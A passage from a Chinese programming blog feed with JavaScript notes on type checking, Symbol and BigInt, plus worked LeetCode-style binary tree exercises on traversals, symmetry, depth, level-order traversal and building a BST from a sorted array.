class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span>);                    <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">true</span> <span class="keyword">instanceof</span> <span class="built_in">Boolean</span>);                <span class="comment">// false </span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'str'</span> <span class="keyword">instanceof</span> <span class="built_in">String</span>);                <span class="comment">// false  </span></span><br><span class="line"><span class="built_in">console</span>.log([] <span class="keyword">instanceof</span> <span class="built_in">Array</span>);                    <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125; <span class="keyword">instanceof</span> <span class="built_in">Function</span>);       <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125; <span class="keyword">instanceof</span> <span class="built_in">Object</span>);                   <span class="comment">// true  </span></span><br><span class="line"><span class="comment">//问题：字面值被实例化才可</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">2</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>);                    <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>) <span class="keyword">instanceof</span> <span class="built_in">Boolean</span>);                <span class="comment">// true </span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'str'</span>) <span class="keyword">instanceof</span> <span class="built_in">String</span>);                <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>Object.prototype.toString.call()</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.toString()<span class="comment">//"function Object() &#123; [native code] &#125;"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString()<span class="comment">//"[object Object]"</span></span><br><span class="line"><span class="comment">//Object对象和它的原型链上各自有一个toString()方法，第一个返回的是一个函数，第二个返回的是值类型。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="number">2</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="literal">true</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="string">'str'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call([]));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(&#123;&#125;));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="literal">undefined</span>));</span><br><span class="line"><span class="built_in">console</span>.log(a.call(<span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// [object Number]</span></span><br><span class="line"><span class="comment">// [object Boolean]</span></span><br><span class="line"><span class="comment">// [object String]</span></span><br><span class="line"><span class="comment">// [object Array]</span></span><br><span class="line"><span class="comment">// [object Function]</span></span><br><span class="line"><span class="comment">// [object Object]</span></span><br><span class="line"><span class="comment">// [object Undefined]</span></span><br><span class="line"><span class="comment">// [object Null]</span></span><br></pre></td></tr></table></figure><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><ul><li>为什么要用Symbol？</li></ul><p>ES5里面的对象的属性名是字符串，当我们使用时，若想添加一些新属性，可能会出现重名的情况，于是我们借助Symbol来生成一个独一无二的值，这样就可以防止属性名的冲突了。</p><ul><li>Symbol是什么</li></ul><p>她是ES6新引入的一种原始类型数据，使用Symbol可以直接生成一个新的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a1 = <span class="built_in">Symbol</span>(<span class="string">"a1"</span>)</span><br><span class="line"><span class="keyword">let</span> a2 = <span class="built_in">Symbol</span>(<span class="string">"a2"</span>)</span><br><span class="line">a1===a2 <span class="comment">//false</span></span><br></pre></td></tr></table></figure><h2 id="Bigint"><a href="#Bigint" class="headerlink" title="Bigint"></a>Bigint</h2><p>JS 中的<code>Number</code>类型只能安全地表示<code>-9007199254740991 (-(2^53-1))</code> 和<code>9007199254740991(2^53-1)</code>之间的整数，任何超出此范围的整数值都可能失去精度。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">90099999999999992</span> == <span class="number">90099999999999993</span> <span class="comment">//true</span></span><br><span class="line"><span class="comment">//使用新的数据类型BigInt  直接在数字后面加n即可</span></span><br><span class="line"><span class="number">90099999999999992</span>n == <span class="number">90099999999999993</span>n <span class="comment">//false</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">90099999999999992</span>n  <span class="comment">//"bigint"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-二叉树相关</title>
      <link href="2020/03/05/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9B%B8%E5%85%B3/"/>
      <url>2020/03/05/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<ul><li>二叉树的前序遍历，中序遍历，后序遍历的递归与非递归</li><li>判断二叉树是否相同</li><li>判断二叉树是否对称</li><li>求二叉树的深度</li><li>二叉树的层次遍历</li><li>有序数组转二叉搜索树</li><li>判断平衡二叉树</li><li>验证前序序列</li></ul><a id="more"></a><h2 id="二叉树的前序遍历，中序遍历，后序遍历的递归与非递归"><a href="#二叉树的前序遍历，中序遍历，后序遍历的递归与非递归" class="headerlink" title="二叉树的前序遍历，中序遍历，后序遍历的递归与非递归"></a>二叉树的前序遍历，中序遍历，后序遍历的递归与非递归</h2><p>给一棵二叉树</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var root = &#123;</span><br><span class="line">val: 1,</span><br><span class="line">left: &#123;</span><br><span class="line">    val: 2,</span><br><span class="line">    left: &#123;</span><br><span class="line">      val: 4,</span><br><span class="line">    &#125;,</span><br><span class="line">    right:&#123;</span><br><span class="line">      val:5</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">right: &#123;</span><br><span class="line">    val: 3,</span><br><span class="line">    left: &#123;</span><br><span class="line">      val: 6</span><br><span class="line">    &#125;,</span><br><span class="line">    right: &#123;</span><br><span class="line">      val: 7</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val</span>) </span>&#123;  <span class="comment">// 树节点构造方式</span></span><br><span class="line">    <span class="keyword">this</span>.val = val;</span><br><span class="line">    <span class="keyword">this</span>.left = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先序递归</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DLR</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(root.val);</span><br><span class="line">        DLR(root.left);</span><br><span class="line">        DLR(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序递归</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LDR</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">        LDR(root.left);<span class="comment">//先遍历到最左边的节点，然后输出</span></span><br><span class="line">        <span class="built_in">console</span>.log(root.val);</span><br><span class="line">        LDR(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序递归</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LRD</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node!=<span class="literal">null</span>)&#123;</span><br><span class="line">        LRD(root.left);</span><br><span class="line">        LRD(root.right);</span><br><span class="line">        <span class="built_in">console</span>.log(root.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//先序非递归</span></span><br><span class="line"><span class="keyword">var</span> arr=[],res=[];</span><br><span class="line"><span class="keyword">if</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">    arr.push(root);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(arr.length!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> temp=arr.pop();</span><br><span class="line">    res.push(temp.val);</span><br><span class="line">    <span class="comment">//这里先放右边再放左边是因为取出来的顺序相反</span></span><br><span class="line">    <span class="keyword">if</span>(temp.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">        arr.push(temp.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(temp.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">        arr.push(temp.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序非递归</span></span><br><span class="line"><span class="keyword">var</span> arr=[],res=[];</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;    </span><br><span class="line">        arr.push(root);</span><br><span class="line">        root=root.left;  <span class="comment">//找到最左结点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(arr.length==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> temp=arr.pop();<span class="comment">//左节点为空则出栈，找出栈结点的右结点</span></span><br><span class="line">    res.push(temp.val);</span><br><span class="line">    root=temp.right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后序非递归</span></span><br><span class="line"><span class="keyword">var</span> arr=[],res=[];</span><br><span class="line">arr.push(root);</span><br><span class="line"><span class="keyword">while</span>(arr.length!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> p=arr.pop();</span><br><span class="line">    res.push(p.val);</span><br><span class="line">    <span class="keyword">if</span>(p.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">        arr.push(p.left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">        arr.push(p.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res.reverse();</span><br></pre></td></tr></table></figure><h2 id="相同的树"><a href="#相同的树" class="headerlink" title="相同的树"></a>相同的树</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">给定两个二叉树，编写一个函数来检验它们是否相同。</span><br><span class="line"></span><br><span class="line">如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入:       1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">输出: true</span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">输入:      1          1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">输出: false</span><br><span class="line">示例 3:</span><br><span class="line"></span><br><span class="line">输入:       1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isSameTree = <span class="function"><span class="keyword">function</span>(<span class="params">p, q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">null</span> &amp;&amp; q==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((p==<span class="literal">null</span>&amp;&amp;q!==<span class="literal">null</span>) || (p!==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p.val!==q.val) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> isSameTree(p.left,q.left) &amp;&amp; isSameTree(p.right,q.right)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="判断二叉树是否对称"><a href="#判断二叉树是否对称" class="headerlink" title="判断二叉树是否对称"></a>判断二叉树是否对称</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">给定一个二叉树，检查它是否是镜像对称的。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"> / \ / \</span><br><span class="line">3  4 4  3</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line">   \   \</span><br><span class="line">   3    3</span><br></pre></td></tr></table></figure><ul><li>和上题类似，把根节点拿掉，就是判断两个树的关系</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isSymmetric = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> p = root.left</span><br><span class="line">    <span class="keyword">var</span> q = root.right</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">p,q</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p!==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>)||(p==<span class="literal">null</span>&amp;&amp;q!==<span class="literal">null</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p.val!==q.val) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> (fn(p.left,q.right)&amp;&amp;fn(p.right,q.left))</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> fn(p,q)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="求二叉树的深度-最大，最小"><a href="#求二叉树的深度-最大，最小" class="headerlink" title="求二叉树的深度(最大，最小)"></a>求二叉树的深度(最大，最小)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">给定一个二叉树，找出其最大深度。</span><br><span class="line"></span><br><span class="line">二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</span><br><span class="line"></span><br><span class="line">说明: 叶子节点是指没有子节点的节点。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">给定二叉树 [3,9,20,null,null,15,7]，</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">返回它的最大深度 3 。</span><br></pre></td></tr></table></figure><ul><li>递归思想</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> left = maxDepth(root.left)</span><br><span class="line">        <span class="keyword">let</span> right = maxDepth(root.right)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.max(left,right) + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>给定一个二叉树，找出其最小深度。</p><p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例:</p><p>给定二叉树 [3,9,20,null,null,15,7],</p><pre><code>    3   / \  9  20    /  \   15   7返回它的最小深度  2.</code></pre><ul><li>递归</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> minDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> leftDepth = minDepth(root.left)</span><br><span class="line">    <span class="keyword">let</span> rightDepth = minDepth(root.right)</span><br><span class="line">    <span class="comment">// 左子树为空或者右子树为空，左子树为空返回rightDepth + 1,右子树为空返回leftDepth + 1</span></span><br><span class="line">    <span class="comment">// 直接返回 leftDepth + rightDepth + 1 即可</span></span><br><span class="line">    <span class="keyword">if</span>(root.left == <span class="literal">null</span> || root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> leftDepth + rightDepth + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">Math</span>.min(leftDepth, rightDepth)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉树的层次遍历"><a href="#二叉树的层次遍历" class="headerlink" title="二叉树的层次遍历"></a>二叉树的层次遍历</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 队列</span></span><br><span class="line"><span class="keyword">var</span> levelOrderBottom = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> queue = [] , res = []</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> []</span><br><span class="line">    queue.push(root)</span><br><span class="line">    <span class="keyword">while</span>(queue.length!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = queue.shift()</span><br><span class="line">        <span class="built_in">console</span>.log(tmp.val)</span><br><span class="line">        <span class="keyword">if</span>(tmp.left!==<span class="literal">null</span>)&#123;</span><br><span class="line">            queue.push(tmp.left)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tmp.right!==<span class="literal">null</span>)&#123;</span><br><span class="line">            queue.push(tmp.right)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变题型，输出二维数组</span></span><br><span class="line"></span><br><span class="line">二叉树：[<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">15</span>,<span class="number">7</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">   / \</span><br><span class="line">  <span class="number">9</span>  <span class="number">20</span></span><br><span class="line">    /  \</span><br><span class="line">   <span class="number">15</span>   <span class="number">7</span></span><br><span class="line">返回其层次遍历结果：</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  [<span class="number">3</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">20</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> queue = [], arr = [], res = []</span><br><span class="line">    <span class="keyword">if</span> (root !== <span class="literal">null</span>) queue.push(root)</span><br><span class="line">    <span class="keyword">while</span> (queue.length !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> len = queue.length</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> node = queue.shift()</span><br><span class="line">            arr.push(node.val)</span><br><span class="line">            <span class="keyword">if</span> (node.left) queue.push(node.left)</span><br><span class="line">            <span class="keyword">if</span> (node.right) queue.push(node.right)</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(arr)</span><br><span class="line">        arr = []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="有序数组转二叉搜索树"><a href="#有序数组转二叉搜索树" class="headerlink" title="有序数组转二叉搜索树"></a>有序数组转二叉搜索树</h2><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">给定有序数组: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     / \</span><br><span class="line">   -3   9</span><br><span class="line">   /   /</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure><ul><li>每次取中间的值作为根节点</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sortedArrayToBST = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span 